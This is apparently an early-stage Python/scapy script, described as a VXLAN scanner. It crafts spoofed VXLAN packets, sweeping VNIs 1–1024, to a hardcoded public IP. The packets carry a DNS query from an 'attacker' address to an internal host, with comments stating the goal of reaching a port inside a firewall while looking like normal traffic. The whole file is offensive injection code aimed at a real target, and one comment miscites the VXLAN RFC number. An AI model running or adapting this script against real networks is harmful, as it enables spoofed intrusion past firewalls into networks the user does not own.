#!/usr/bin/python
#
# Humble beginnings of a VXLAN scanner

###[ Loading modules ]###
import sys
import getopt
from scapy.all import PcapReader, wrpcap, Packet, NoPayload
from scapy.all import *
from threading import Thread

vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
attacker="185.27.115.6"
destination="10.0.0.10"
# port is the one we want to contact inside the firewall
insideport=53
# this port is a high port, just make this look like a normal request
testport=54040

sr1(IP(src="127.0.0.1",dst="185.129.60.131")/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=(1,1024),flags="Instance")/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,dst="10.0.0.10")/UDP(sport=testport,dport=insideport)/DNS(rd=1,id=0xdead,qd=DNSQR(qname="localhost")),timeout=1)
